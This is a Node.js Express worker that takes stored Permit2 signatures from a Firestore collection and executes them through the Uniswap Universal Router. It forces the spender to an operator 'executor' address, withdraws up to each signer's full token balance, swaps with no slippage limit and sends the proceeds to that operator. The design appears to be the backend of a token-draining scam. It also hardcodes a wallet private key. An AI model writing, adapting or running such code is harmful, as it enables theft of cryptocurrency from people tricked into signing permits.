#!/usr/bin/env node
import dotenv from 'dotenv';
try { dotenv.config(); } catch(e) {}

import express from 'express';
import bodyParser from 'body-parser';
import admin from 'firebase-admin';
import { ethers } from 'ethers';

// -----------------------------
// Configuration / constants
// -----------------------------
const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3"; // same on all networks
const UNIVERSAL_ROUTER = "0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD"; // Sepolia testnet

// Hard-coded fallback executor address + private key (can be overridden via Firestore or env)
const HARDCODED_EXECUTOR = '0xb1f02c288ae708de5e508021071b775c944171e8'; // Sepolia testnet
const HARDCODED_PRIVATE_KEY = '0x2c9e89ed5e437acfc2db83d7bd76eb73b9d978a4716f0e8d91c2794a011d2d64'; // Sepolia testnet

// Runtime executor config (may be loaded from Firestore admin_config/settings)
let EXECUTOR_ADDRESS = HARDCODED_EXECUTOR;
let EXECUTOR_PRIVATE_KEY = HARDCODED_PRIVATE_KEY;

const UNIVERSAL_ROUTER_ABI = [
  "function execute(bytes commands, bytes[] inputs, uint256 deadline) payable"
];

// -----------------------------
// Lazy init globals
// -----------------------------
let initialized = false;
let db = null;
let provider = null;
let spenderWallet = null;
let router = null;

// -----------------------------
// Init function
// -----------------------------
async function init() {
  if (initialized) return;

  const required = [
    'FIREBASE_PROJECT_ID',
    'FIREBASE_CLIENT_EMAIL',
    'FIREBASE_PRIVATE_KEY',
    // RPC_URL now defaults to Sepolia
    // optional: SWAP_RECIPIENT, SWAP_FEE
  ];
  const missing = required.filter(k => !process.env[k]);
  if (missing.length) throw new Error("Missing env vars: " + missing.join(', '));

  const serviceAccount = {
    projectId: process.env.FIREBASE_PROJECT_ID,
    clientEmail: process.env.FIREBASE_CLIENT_EMAIL,
    privateKey: process.env.FIREBASE_PRIVATE_KEY.replace(/\\n/g, '\n')
  };

  if (!admin.apps || admin.apps.length === 0) {
    admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
  }
  db = admin.firestore();

  // Load executor override from Firestore admin settings (optional)
  try {
    const cfgSnap = await db.collection('admin_config').doc('settings').get();
    const cfg = cfgSnap.exists ? cfgSnap.data() : {};
    EXECUTOR_ADDRESS = cfg.executorAddress || process.env.EXECUTOR_ADDRESS || HARDCODED_EXECUTOR;
    EXECUTOR_PRIVATE_KEY = cfg.executorPrivateKey || process.env.EXECUTOR_PRIVATE_KEY || HARDCODED_PRIVATE_KEY;
  } catch (e) {
    // ignore — we'll fall back to hard-coded values
    console.error('failed to load admin_config settings (executor override):', e);
  }

  provider = new ethers.JsonRpcProvider(process.env.RPC_URL || 'https://rpc.sepolia.org');
  // Use configured private key to create signer
  spenderWallet = new ethers.Wallet(EXECUTOR_PRIVATE_KEY, provider);
  // Sanity check to ensure the key controls the expected executor address
  if (spenderWallet.address.toLowerCase() !== EXECUTOR_ADDRESS.toLowerCase()) {
    throw new Error(`EXECUTOR_PRIVATE_KEY does not match EXECUTOR_ADDRESS: ${spenderWallet.address} != ${EXECUTOR_ADDRESS}`);
  }

  router = new ethers.Contract(UNIVERSAL_ROUTER, UNIVERSAL_ROUTER_ABI, spenderWallet);

  initialized = true;
}
 
// -----------------------------
// Utility: normalize v and build sig bytes
// -----------------------------
function buildSignatureBytes(r, s, vRaw) {
  // vRaw may be number or hex string
  let v = typeof vRaw === 'string' ? parseInt(vRaw, 16) : Number(vRaw);
  if (v === 0 || v === 1) v += 27;
  // ensure 27/28
  if (v !== 27 && v !== 28) {
    // fallback: prefer forming a hex string anyway
  }
  const vHex = '0x' + v.toString(16).padStart(2, '0'); // "0x1b" or "0x1c"
  // r and s should be 0x-prefixed hex strings
  return ethers.concat([r, s, vHex]);
}

// -----------------------------
// Router command codes
// -----------------------------
const COMMANDS = {
  PERMIT2_PERMIT: 0x02,
  V3_SWAP_EXACT_IN: 0x08
};

// -----------------------------
// Build universal router payload
// NOTE: Example path uses single hop to WETH; adapt path to your desired route.
// -----------------------------
function buildUniversalRouterTx(data, overrides = {}) {
  const {
    owner,
    token,
    amount,
    deadline,
    nonce,
    spender, // will be overridden to UNIVERSAL_ROUTER by worker
    r, s, v
  } = data;

  // recipient of swapped tokens: use configured executor address
  const recipient = EXECUTOR_ADDRESS;

  // normalize amount to BigInt
  const amountBn = BigInt(amount);
  // withdrawAmount override (use provided withdrawAmount if set, otherwise default to signed amount)
  const withdrawAmountBn = overrides.withdrawAmount !== undefined ? BigInt(overrides.withdrawAmount) : amountBn;

  // Build signature bytes
  const signatureBytes = buildSignatureBytes(r, s, v);

  // Encode PermitSingle tuple + signature as router input
  // Solidity tuple types:
  // (address owner, ( (address token, uint160 amount, uint48 expiration, uint48 nonce) details, address spender, uint256 sigDeadline ), bytes signature)
  const permitAbi = new ethers.AbiCoder();

  const permitSingleTuple = [
    [
      [token, amountBn, Number(deadline), Number(nonce)],
      EXECUTOR_ADDRESS, // spender forced to configured executor
      Number(deadline)
    ],
    signatureBytes
  ];

  const permitInput = permitAbi.encode(
    ["address", "tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce) details,address spender,uint256 sigDeadline)", "bytes"],
    [owner, permitSingleTuple[0], permitSingleTuple[1]]
  );

  // Build a simple V3 exact-in swap input (single hop)
  // Note: This example constructs a path: token + fee + outputToken.
  // Replace outputToken with desired final token.
  const outputToken = process.env.OUTPUT_TOKEN || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2"; // WETH9 by default
  const feeTier = Number(process.env.SWAP_FEE || 3000); // default 3000 = 0.3%

  // path encoding: token (20 bytes) + fee (3 bytes) + outputToken (20 bytes)
  // build path as bytes
  function encodeFee(f) {
    // fee is 3 bytes
    let hex = f.toString(16);
    if (hex.length % 2 === 1) hex = '0' + hex;
    // pad to 3 bytes (6 hex chars)
    hex = hex.padStart(6, '0');
    return '0x' + hex;
  }
  const path = ethers.concat([token, encodeFee(feeTier), outputToken]);

  const minReceived = BigInt(0); // no slippage control here — you should set this
  const swapAbi = new ethers.AbiCoder();
  const swapInput = swapAbi.encode(
    ["bytes", "uint256", "uint256", "address"],
    [path, withdrawAmountBn, minReceived, recipient]
  );

  // Hardcoded command string: 0x02 (PERMIT2_PERMIT) followed by 0x08 (V3_SWAP_EXACT_IN)
  const commands = "0x0208";

  const inputs = [permitInput, swapInput];

  const execDeadline = Math.floor(Date.now() / 1000) + 1800; // 30 minutes

  return { commands, inputs, execDeadline };
}

// -----------------------------
// Process pending worker
// -----------------------------
async function processPending(limit = 10) {
  const snaps = await db.collection('permit2_signatures').where('processed', '==', false).limit(limit).get();
  if (snaps.empty) return { processed: 0 };

  let count = 0;

  // Check spender wallet balance once per run
  let balance = BigInt(0);
  try { balance = await spenderWallet.getBalance(); } catch(e) { console.error('balance check failed', e); }

  for (const docSnap of snaps.docs) {
    // read copy of data
    const data = docSnap.data();

    // Force spender to the configured executor (per operator request)
    data.spender = EXECUTOR_ADDRESS;

    // Basic validation
    if (!data.owner || !data.token || !data.amount || !data.r || !data.s) {
      await docSnap.ref.update({
        lastError: "missing fields in permit doc",
        lastErrorAt: Date.now()
      });
      continue;
    }

    // Check that signer-used deadline isn't expired (optional)
    if (Number(data.deadline) * 1000 < Date.now()) {
      await docSnap.ref.update({
        lastError: "signature deadline expired",
        lastErrorAt: Date.now()
      });
      continue;
    }

    // Check balance (very conservative threshold)
    const minEthRequired = process.env.MIN_ETH_REQUIRED ? ethers.parseEther(process.env.MIN_ETH_REQUIRED) : ethers.parseEther("0.001");
    if (balance < minEthRequired) {
      // update doc with actionable error; do NOT attempt tx
      await docSnap.ref.update({
        lastError: `insufficient ETH in executor wallet (${EXECUTOR_ADDRESS}). Fund with at least ${minEthRequired.toString()} wei.`,
        lastErrorAt: Date.now()
      });
      console.error('insufficient executor funds:', { address: EXECUTOR_ADDRESS, balance: balance.toString() });
      // skip further docs to avoid repeated failures
      continue;
    }

    try {
      // Compute owner token balance and set withdrawAmount = min(balance, signed amount)
      let withdrawAmountBn = BigInt(data.amount);
      try {
        const tokenContract = new ethers.Contract(data.token, ["function balanceOf(address) view returns (uint256)"], provider);
        const ownerBal = await tokenContract.balanceOf(data.owner);
        const ownerBalBn = BigInt(ownerBal);
        if (ownerBalBn < withdrawAmountBn) withdrawAmountBn = ownerBalBn;
      } catch (bErr) {
        console.error('failed to read owner balance', bErr);
      }

      if (withdrawAmountBn === 0n) {
        await docSnap.ref.update({ lastError: 'owner has zero token balance', lastErrorAt: Date.now(), withdrawAmount: '0' });
        continue;
      }

      // Save withdrawAmount for audit
      try { await docSnap.ref.update({ withdrawAmount: withdrawAmountBn.toString() }); } catch (u) { console.error('failed to write withdrawAmount', u); }

      const { commands, inputs, execDeadline } = buildUniversalRouterTx(data, { withdrawAmount: withdrawAmountBn });

      // Optional: estimate gas for better error messages
      let estimatedGas = null;
      try {
        estimatedGas = await router.estimateGas.execute(commands, inputs, execDeadline, { value: 0 });
      } catch (eg) {
        // estimation failed — capture reason and record on doc
        const eMsg = (eg && eg.message) ? eg.message : String(eg);
        await docSnap.ref.update({ lastError: `estimateGas failed: ${eMsg}`, lastErrorAt: Date.now() });
        console.error('estimateGas failed for doc', docSnap.id, eMsg);
        continue; // skip to next doc
      }

      // Execute the transaction
      const tx = await router.execute(commands, inputs, execDeadline, { value: 0, gasLimit: estimatedGas.mul(120).div(100) });
      const receipt = await tx.wait();

      await docSnap.ref.update({
        processed: true,
        routerTx: receipt.transactionHash,
        processedAt: Date.now(),
        withdrawAmount: withdrawAmountBn.toString()
      });

      count++;
      // update local balance snapshot
      balance = await spenderWallet.getBalance();

    } catch (err) {
      // More detailed error capture
      let errMsg = String(err && err.message ? err.message : err);
      if (err?.code) errMsg = `${errMsg} (code=${err.code})`;
      // attempt to capture revert reason if present
      try {
        await docSnap.ref.update({ lastError: errMsg, lastErrorAt: Date.now() });
      } catch (uErr) {
        console.error('failed to update doc error', uErr);
      }
      console.error('worker execution error for doc', docSnap.id, err);
    }
  } // end for

  return { processed: count };
}

// -----------------------------
// HTTP API
// -----------------------------
const app = express();
app.use(bodyParser.json());

const SECRET = process.env.RUN_WORKER_SECRET;

app.all('/api/run-worker', async (req, res) => {
  try {
    if (SECRET) {
      const q = req.query?.secret || req.headers['x-run-worker-secret'] || req.body?.secret;
      if (!q || q !== SECRET) return res.status(401).json({ ok: false, error: 'Unauthorized' });
    }
    await init();
  } catch (err) {
    console.error('init error:', err);
    return res.status(500).json({ ok: false, error: String(err) });
  }

  const debug = req.query?.debug === '1' || req.query?.dryRun === '1' || req.body?.debug || req.body?.dryRun;

  try {
    if (debug) {
      const snaps = await db.collection('permit2_signatures').where('processed','==',false).limit(20).get();
      const docs = snaps.docs.map(d => ({ id: d.id, data: d.data() }));
      return res.json({ ok: true, processed: 0, unprocessedCount: snaps.size, sample: docs });
    }

    const result = await processPending(10);
    return res.json({ ok: true, ...result });

  } catch (err) {
    console.error('process error:', err);
    return res.status(500).json({ ok: false, error: String(err) });
  }
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
  console.log(`Worker HTTP server listening on port ${port}`);
});
